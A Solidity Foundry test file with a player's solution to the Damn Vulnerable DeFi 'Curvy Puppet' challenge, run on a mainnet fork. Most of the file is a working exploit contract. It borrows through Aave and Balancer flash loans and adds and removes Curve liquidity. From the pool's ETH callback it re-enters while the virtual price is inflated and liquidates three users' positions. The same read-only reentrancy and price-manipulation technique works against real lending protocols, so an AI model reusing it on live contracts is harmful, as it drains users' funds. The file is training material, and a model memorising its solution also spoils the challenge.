// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({
            asset: ETH,
            value: ETHER_PRICE,
            expiration: block.timestamp + 1 days
        });
        oracle.setPrice({
            asset: address(dvt),
            value: DVT_PRICE,
            expiration: block.timestamp + 1 days
        });

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(
            address(lending),
            LENDER_INITIAL_LP_BALANCE
        );
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            TREASURY_LP_BALANCE
        );

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(
                lending.getCollateralValue(collateralAmount) /
                    lending.getBorrowValue(borrowAmount),
                3
            );
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        // 목표는 3명의 user 포지션을 모두 청산시키고, treasury에 모든 자산 전송
        // curve pool의 균형을 깨트려 virtual price를 최대한 올린 뒤 user들의 포지션 청산
        // 현재 가용 가능한 자산 200 WETH, 65 LP tokens으로는 lp token 목표 가격에 도달할 수 없다.
        // 따라서 어디에선가 자산을 빌림 -> 공격 수행 -> 다시 상환 == Flashloan
        // Aave flashloan을 사용하여 공격 수행

        Attack attack = new Attack(dvt, lending, alice, bob, charlie, treasury);
        weth.transferFrom(treasury, address(attack), TREASURY_WETH_BALANCE);

        IERC20(curvePool.lp_token()).transferFrom(
            treasury,
            address(attack),
            TREASURY_LP_BALANCE
        );

        attack.attack();
    }
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(
                lending.getCollateralAmount(users[i]),
                0,
                "User position still has collateral assets"
            );
            assertEq(
                lending.getBorrowAmount(users[i]),
                0,
                "User position still has borrowed assets"
            );
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            0,
            "Treasury doesn't have any LP tokens left"
        );
        assertEq(
            dvt.balanceOf(treasury),
            USER_INITIAL_COLLATERAL_BALANCE * 3,
            "Treasury doesn't have the users' DVT"
        );

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(player),
            0,
            "Player still has LP tokens"
        );
    }
}

interface IAaveFlashLoan {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract Attack {
    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    IERC20 lpToken;

    IAaveFlashLoan aaveFlashLoan =
        IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapV2Factory private constant factory =
        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2Pair private immutable pair;
    IBalancer Balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address alice;
    address bob;
    address charlie;
    address treasury;

    constructor(
        DamnValuableToken _dvt,
        CurvyPuppetLending _lending,
        address _alice,
        address _bob,
        address _charlie,
        address _treasury
    ) {
        dvt = _dvt;
        lending = _lending;
        lpToken = IERC20(_lending.borrowAsset());
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
        treasury = _treasury;
        pair = IUniswapV2Pair(factory.getPair(address(weth), address(stETH)));
    }

    function attack() external {
        address[] memory assets = new address[](2);
        assets[0] = address(weth);
        assets[1] = address(stETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 28000 ether; // need 98000, 50000 in aave, 48000 in uniswapV2
        amounts[1] = 171000 ether;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0; // 0 means no debt, we will pay
        modes[1] = 0;

        lpToken.approve(address(permit2), type(uint256).max);

        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: 3e18,
            expiration: uint48(block.timestamp)
        });

        weth.approve(address(aaveFlashLoan), type(uint256).max);
        stETH.approve(address(aaveFlashLoan), type(uint256).max);

        aaveFlashLoan.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37900 ether;
        Balancer.flashLoan(address(this), tokens, amounts, "");
        console.log("weth balance:", weth.balanceOf(address(this)));
        console.log("eth balance:", address(this).balance);
        console.log("stETH balance:", stETH.balanceOf(address(this)));

        return true;
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata data
    ) external {
        uint256 wethBalance = weth.balanceOf(address(this));
        uint256 stETHBalance = stETH.balanceOf(address(this));
        weth.approve(address(weth), type(uint256).max);
        weth.withdraw(wethBalance);
        stETH.approve(address(curvePool), stETHBalance);
        uint256[2] memory amounts = [wethBalance, stETHBalance];
        curvePool.add_liquidity{value: wethBalance}(amounts, 0);

        lpToken.approve(address(lending), lpToken.balanceOf(address(this)));
        curvePool.remove_liquidity(
            lpToken.balanceOf(address(this)) - 3 ether - 1,
            [uint256(0), uint256(0)]
        );

        uint256 a = 28771676037440948418798 - 28025200000000000000000;
        uint256 exchangeAmount = 11000 ether + a - 1;
        curvePool.exchange{value: exchangeAmount}(0, 1, exchangeAmount, 0);

        weth.deposit{value: address(this).balance}();
        weth.transfer(treasury, 1);

        weth.transfer(address(Balancer), 37900 ether);
    }

    receive() external payable {
        if (msg.sender == address(curvePool)) {
            /**
                remove liquidity 상황에서 eth는 다시 사용자에게 보낸 상태이고 lp token은 burn되지 않은 
                상태이기 때문에 순간적으로 virtual price의 수치가 올라감
                target virtual == price는 3.6이상
             */
            // console.log("virtual price:", curvePool.get_virtual_price() / 1e17);
            // require(
            //     curvePool.get_virtual_price() / 1e17 >= 36,
            //     "virtual price is not enough"
            // );
            // console.log(
            //     "lp token balance:",
            //     lpToken.balanceOf(address(this)) / 1e18
            // );
            require(
                lpToken.balanceOf(address(this)) >= 3 ether,
                "lp token balance is not enough"
            );

            lending.liquidate(alice);
            lending.liquidate(bob);
            lending.liquidate(charlie);

            dvt.transfer(treasury, 7500 ether);
            lpToken.transfer(treasury, 1);
        }
    }
}
// forge test --match-test test_curvyPuppet -vvvv --block-gas-limit 1000000000000000
// gas limit is set to 1000000000000000 to avoid out of gas error
